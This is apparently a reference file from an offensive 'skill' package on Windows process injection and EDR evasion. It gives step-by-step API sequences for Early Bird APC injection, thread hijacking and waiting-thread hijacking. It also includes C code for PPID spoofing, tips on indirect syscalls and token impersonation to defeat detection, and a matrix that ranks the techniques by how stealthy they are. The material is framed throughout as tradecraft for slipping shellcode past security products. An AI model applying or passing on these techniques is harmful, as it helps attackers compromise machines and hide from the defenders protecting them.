# Process Injection Patterns — Detail

EDR monitors classic `OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread`. Avoid it.

## Early Bird APC Injection

Injects shellcode into a freshly-created suspended process before EDR has loaded its DLL and hooked functions:

1. `CreateProcess(target, CREATE_SUSPENDED | CREATE_NO_WINDOW)` → `pi`
2. `VirtualAllocEx(pi.hProcess, PAGE_READWRITE)` → `remoteBase`
3. `WriteProcessMemory(pi.hProcess, remoteBase, shellcode)`
4. `VirtualProtectEx(pi.hProcess, remoteBase, PAGE_EXECUTE_READ)` — flip R→X only after write
5. `QueueUserAPC(remoteBase, pi.hThread)` — APC fires when thread resumes
6. `ResumeThread(pi.hThread)` — thread enters alertable state at init, fires APC

**Why it works**: EDR DLL not yet injected → hooks not in place when APC runs.

**EDR countermeasures (2025)**: `QueueUserAPC` pointing to non-.text memory flagged; `CREATE_SUSPENDED` + early APC pattern detected. Use indirect syscalls for steps 2-5.

**Variant — Early Cryo Bird**: `NtSetInformationJobObject(JOBOBJECT_FREEZE_INFORMATION)` freezes without `CREATE_SUSPENDED` flag.

## Thread Hijacking

Redirect an existing thread's RIP to shellcode without creating a new thread:

1. `OpenThread(THREAD_ALL_ACCESS, tid)` → `hThread`
2. `SuspendThread(hThread)`
3. `GetThreadContext(hThread, &ctx)` (ctx.ContextFlags = CONTEXT_FULL)
4. Set `ctx.Rip = remoteShellcodeBase`; fix `RCX/RDX/R8/R9` for args if needed
5. `SetThreadContext(hThread, &ctx)`
6. `ResumeThread(hThread)`

**EDR signal**: `SuspendThread` + `SetThreadContext` pair monitored (ETW 2 events). Use `NtGetContextThread`/`NtSetContextThread` via indirect syscall.

**Waiting Thread Hijacking (2025 variant)**: target thread already suspended in `NtDelayExecution`. No `SuspendThread` call, no `THREAD_SUSPEND_RESUME` access needed. Requires polling RIP until inside `NtDelayExecution`.

## PPID Spoofing

Makes child process appear spawned by trusted parent (e.g. `explorer.exe`) to defeat parent-child behavioral rules:

```c
InitializeProcThreadAttributeList(attrs, 1, 0, &size);
UpdateProcThreadAttribute(attrs, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hParent, sizeof(HANDLE), NULL, NULL);
STARTUPINFOEX si = { .StartupInfo.cb = sizeof(si), .lpAttributeList = attrs };
CreateProcessW(L"target.exe", ..., &si, &pi);
```

**EDR countermeasure**: kernel callback compares caller PID vs PPID attribute → mismatch logged. Mitigate with token impersonation of spoofed parent before `CreateProcess`.

**Token inheritance**: spoofed parent with SYSTEM token → child inherits it.

**Access required**: open parent handle with `PROCESS_CREATE_PROCESS` access.

## Injection Decision Matrix

| Technique | New thread? | Pre-hook window? | EDR signal | Best use |
|-----------|------------|-----------------|-----------|---------|
| Classic CRT | Yes | No | HIGH (hooked) | Avoid |
| Early Bird APC | APC (no new TID) | Yes | MEDIUM | Fresh-process inject |
| Early Cryo Bird | APC via job freeze | Yes (no suspended flag) | LOW-MEDIUM | Stealthier fresh-process |
| Thread hijacking | No | No | MEDIUM (SuspendThread) | Existing process |
| Waiting thread hijack | No | No (but no Suspend needed) | LOW | Existing sleeping thread |
| Callback-based (§6b in SKILL.md) | No | No | LOW | Same-process exec |
